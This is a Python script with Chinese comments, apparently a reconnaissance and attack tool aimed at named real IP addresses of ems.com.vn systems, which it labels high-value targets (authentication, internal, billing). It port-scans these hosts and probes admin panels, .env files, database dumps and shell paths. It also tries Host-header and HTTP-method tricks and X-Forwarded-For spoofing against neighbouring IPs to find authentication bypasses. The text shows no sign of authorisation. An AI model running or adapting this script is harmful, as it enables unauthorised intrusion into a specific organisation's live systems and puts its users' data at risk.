#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真实 IP 深度扫描和安全测试
"""

import socket
import requests
import urllib3
import time
import threading
import concurrent.futures
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 高价值真实 IP
HIGH_VALUE_IPS = [
    ('222.255.250.247', 'auth.ems.com.vn - 认证系统'),
    ('222.255.250.234', 'internal.ems.com.vn - 内部系统'),
    ('222.255.250.240', 'bill.ems.com.vn - 账单系统'),
    ('222.255.250.228', '双系统 - Laravel + ASP.NET'),
    ('115.146.121.131', 'docws.ems.com.vn - API文档'),
    ('115.146.121.152', 'qllogistics.ems.com.vn - Django系统')
]

# 同网段其他 IP
SAME_SEGMENT_IPS = {
    '222.255.250.': ['226', '227', '232', '233', '237', '242', '243'],
    '115.146.121.': ['133', '135', '141', '145', '147', '150', '151', '154']
}

class RealIPScanner:
    def __init__(self):
        self.results = {}
        
    def full_port_scan(self, ip, quick=False):
        """全端口扫描"""
        print(f"\n[*] 端口扫描: {ip}")
        open_ports = []
        
        if quick:
            # 快速扫描常见端口
            ports = [21, 22, 23, 25, 53, 80, 81, 82, 88, 110, 111, 135, 139, 143, 161, 
                    443, 445, 465, 514, 587, 631, 873, 993, 995, 1080, 1099, 1433, 1434,
                    1521, 1723, 2049, 2082, 2083, 2181, 2222, 2375, 3000, 3128, 3306, 
                    3389, 4000, 4443, 4444, 5000, 5432, 5555, 5900, 5984, 6379, 6666,
                    7000, 7001, 7070, 8000, 8008, 8020, 8080, 8081, 8088, 8090, 8443,
                    8888, 9000, 9090, 9200, 9300, 9999, 10000, 11211, 27017, 50000]
        else:
            # 全端口扫描 (1-10000)
            ports = range(1, 10001)
        
        # 使用线程池加速
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, ip, port): port 
                             for port in ports}
            
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result():
                        open_ports.append(port)
                        print(f"  [✓] 端口 {port} 开放")
                except:
                    pass
        
        return sorted(open_ports)
    
    def check_port(self, ip, port):
        """检查单个端口"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    
    def test_auth_bypass(self, ip, domain=None):
        """测试认证绕过"""
        print(f"\n[*] 测试认证绕过: {ip}")
        bypasses = []
        
        # 测试路径
        sensitive_paths = [
            '/admin', '/admin/', '/admin/dashboard', '/admin/users',
            '/api', '/api/', '/api/v1/users', '/api/admin',
            '/dashboard', '/panel', '/console', '/manage',
            '/phpmyadmin', '/adminer', '/db',
            '/.env', '/config.php', '/config.json',
            '/backup', '/backups', '/dump.sql',
            '/logs', '/log', '/debug',
            '/shell', '/terminal', '/exec'
        ]
        
        # 测试不同协议和端口
        for port in [80, 443, 8080, 8443]:
            for protocol in ['http', 'https']:
                if (protocol == 'https' and port in [443, 8443]) or (protocol == 'http' and port in [80, 8080]):
                    base_url = f"{protocol}://{ip}:{port}"
                    
                    # 使用 IP 直接访问 vs 使用域名
                    for use_host in [False, True]:
                        headers = {}
                        if use_host and domain:
                            headers['Host'] = domain
                            test_desc = f"使用 Host: {domain}"
                        else:
                            test_desc = "直接 IP 访问"
                        
                        for path in sensitive_paths:
                            try:
                                url = base_url + path
                                resp = requests.get(url, headers=headers, verify=False, 
                                                  timeout=3, allow_redirects=False)
                                
                                # 检查是否绕过了认证
                                if resp.status_code in [200, 403]:
                                    # 200 可能是成功访问，403 说明路径存在
                                    if resp.status_code == 200:
                                        # 检查是否真的是管理页面而不是登录页
                                        if 'login' not in resp.text.lower() or 'dashboard' in resp.text.lower():
                                            bypasses.append({
                                                'url': url,
                                                'method': test_desc,
                                                'status': resp.status_code,
                                                'title': self.extract_title(resp.text)
                                            })
                                            print(f"  [!] 可能的绕过: {url} ({test_desc}) - {resp.status_code}")
                                    elif resp.status_code == 403:
                                        print(f"  [*] 路径存在但禁止访问: {path} ({test_desc})")
                                        
                            except:
                                pass
        
        # 测试 HTTP 方法
        print(f"\n  测试 HTTP 方法绕过...")
        for method in ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'PATCH']:
            try:
                url = f"http://{ip}/admin"
                resp = requests.request(method, url, verify=False, timeout=3)
                if resp.status_code not in [405, 501]:  # 不是 Method Not Allowed
                    print(f"  [*] {method} 方法返回: {resp.status_code}")
            except:
                pass
        
        return bypasses
    
    def check_network_trust(self, base_ip):
        """检查同网段信任关系"""
        print(f"\n[*] 检查网段信任关系: {base_ip}.x")
        trust_relationships = []
        
        # 获取网段前缀
        ip_parts = base_ip.split('.')
        segment = '.'.join(ip_parts[:3]) + '.'
        
        # 获取要测试的 IP
        if segment in SAME_SEGMENT_IPS:
            test_ips = [segment + suffix for suffix in SAME_SEGMENT_IPS[segment]]
            
            print(f"  测试 {len(test_ips)} 个同网段 IP...")
            
            for test_ip in test_ips:
                # 快速检查是否存活
                if self.check_port(test_ip, 80) or self.check_port(test_ip, 443):
                    print(f"\n  检查 {test_ip}:")
                    
                    # 测试是否可以相互访问内部资源
                    for port in [80, 443, 8080]:
                        try:
                            # 尝试访问可能的内部接口
                            url = f"http://{test_ip}:{port}/internal"
                            resp = requests.get(url, timeout=2, verify=False)
                            
                            if resp.status_code != 404:
                                print(f"    [*] {test_ip}:{port}/internal - {resp.status_code}")
                                
                            # 测试是否可以访问其他 IP 的管理接口
                            headers = {'X-Forwarded-For': base_ip, 'X-Real-IP': base_ip}
                            resp = requests.get(f"http://{test_ip}:{port}/admin", 
                                              headers=headers, timeout=2, verify=False)
                            
                            if resp.status_code in [200, 301, 302]:
                                trust_relationships.append({
                                    'from': base_ip,
                                    'to': test_ip,
                                    'type': 'X-Forwarded-For 信任'
                                })
                                print(f"    [!] 可能存在信任关系: {base_ip} -> {test_ip}")
                                
                        except:
                            pass
        
        return trust_relationships
    
    def find_hidden_interfaces(self, ip, open_ports):
        """寻找隐藏的管理接口"""
        print(f"\n[*] 寻找隐藏管理接口: {ip}")
        hidden_interfaces = []
        
        # 隐藏路径字典
        hidden_paths = [
            # 管理接口
            '/hidden', '/secret', '/private', '/internal',
            '/sys', '/system', '/adm', '/root',
            '/_admin', '/_manage', '/~admin',
            '/admin-console', '/admin-panel', '/controlpanel',
            '/manager/html', '/manager/status',
            
            # 监控接口
            '/status', '/health', '/metrics', '/stats',
            '/monitor', '/monitoring', '/_status',
            '/server-status', '/nginx_status',
            
            # API 接口
            '/api/internal', '/api/private', '/api/admin',
            '/internal/api', '/private/api',
            '/v1/internal', '/v2/internal',
            
            # 调试接口
            '/debug', '/trace', '/profiler',
            '/test', '/testing', '/dev',
            '/_debug', '/debugbar', '/telescope',
            
            # 数据库接口
            '/sql', '/query', '/database',
            '/phpmyadmin', '/pma', '/myadmin',
            '/adminer', '/db', '/mysql',
            
            # 特殊端口路径
            '/:8080/admin', '/:8443/admin',
            '/:9000/admin', '/:9090/admin'
        ]
        
        # 在每个开放端口上测试
        for port in open_ports:
            if port in [80, 443, 8080, 8443, 8888, 9000]:
                protocol = 'https' if port in [443, 8443] else 'http'
                base_url = f"{protocol}://{ip}:{port}"
                
                for path in hidden_paths:
                    try:
                        url = base_url + path
                        resp = requests.get(url, verify=False, timeout=3, allow_redirects=False)
                        
                        if resp.status_code in [200, 301, 302, 401, 403]:
                            # 分析响应
                            is_interesting = False
                            reason = ""
                            
                            if resp.status_code == 200:
                                # 检查是否是真的管理页面
                                content_lower = resp.text.lower()
                                if any(keyword in content_lower for keyword in 
                                      ['admin', 'manage', 'dashboard', 'console', 'panel']):
                                    is_interesting = True
                                    reason = "管理界面关键词"
                                elif 'json' in resp.headers.get('Content-Type', ''):
                                    is_interesting = True
                                    reason = "JSON API"
                                elif len(resp.text) > 500:  # 不是空页面
                                    is_interesting = True
                                    reason = "非空页面"
                                    
                            elif resp.status_code == 401:
                                is_interesting = True
                                reason = "需要认证"
                            elif resp.status_code == 403:
                                is_interesting = True
                                reason = "禁止访问"
                                
                            if is_interesting:
                                hidden_interfaces.append({
                                    'url': url,
                                    'status': resp.status_code,
                                    'reason': reason,
                                    'title': self.extract_title(resp.text) if resp.status_code == 200 else ''
                                })
                                print(f"  [!] 发现隐藏接口: {path} ({resp.status_code}) - {reason}")
                                
                    except:
                        pass
        
        return hidden_interfaces
    
    def extract_title(self, html):
        """提取页面标题"""
        import re
        match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        return match.group(1).strip() if match else ''
    
    def analyze_ip(self, ip, description):
        """完整分析一个 IP"""
        print(f"\n{'='*60}")
        print(f"[+] 深度分析: {ip}")
        print(f"    {description}")
        print(f"{'='*60}")
        
        result = {
            'ip': ip,
            'description': description,
            'open_ports': [],
            'auth_bypasses': [],
            'trust_relationships': [],
            'hidden_interfaces': []
        }
        
        # 1. 端口扫描
        result['open_ports'] = self.full_port_scan(ip, quick=True)
        
        # 2. 测试认证绕过
        domain = None
        if 'auth.ems.com.vn' in description:
            domain = 'auth.ems.com.vn'
        elif 'internal.ems.com.vn' in description:
            domain = 'internal.ems.com.vn'
        elif 'bill.ems.com.vn' in description:
            domain = 'bill.ems.com.vn'
            
        result['auth_bypasses'] = self.test_auth_bypass(ip, domain)
        
        # 3. 检查网段信任关系
        result['trust_relationships'] = self.check_network_trust(ip)
        
        # 4. 寻找隐藏接口
        result['hidden_interfaces'] = self.find_hidden_interfaces(ip, result['open_ports'])
        
        self.results[ip] = result
        return result

# 主程序
print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    真实 IP 深度安全扫描                                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

scanner = RealIPScanner()

# 扫描高价值目标
for ip, desc in HIGH_VALUE_IPS[:3]:  # 先扫描前3个避免太长时间
    scanner.analyze_ip(ip, desc)
    time.sleep(2)  # 避免太快

# 生成报告
print(f"\n\n{'='*60}")
print("[+] 扫描总结")
print(f"{'='*60}")

for ip, result in scanner.results.items():
    print(f"\n目标: {ip}")
    print(f"描述: {result['description']}")
    print(f"开放端口: {len(result['open_ports'])} 个 - {result['open_ports'][:10]}")
    
    if result['auth_bypasses']:
        print(f"\n  [!] 发现认证绕过:")
        for bypass in result['auth_bypasses']:
            print(f"      - {bypass['url']} ({bypass['method']})")
    
    if result['hidden_interfaces']:
        print(f"\n  [!] 发现隐藏接口:")
        for interface in result['hidden_interfaces']:
            print(f"      - {interface['url']} - {interface['reason']}")
    
    if result['trust_relationships']:
        print(f"\n  [!] 发现信任关系:")
        for trust in result['trust_relationships']:
            print(f"      - {trust['from']} -> {trust['to']} ({trust['type']})")

# 保存结果
import json
with open('real_ip_security_scan.json', 'w') as f:
    json.dump(scanner.results, f, indent=2)

print(f"\n\n[+] 扫描结果已保存到: real_ip_security_scan.json")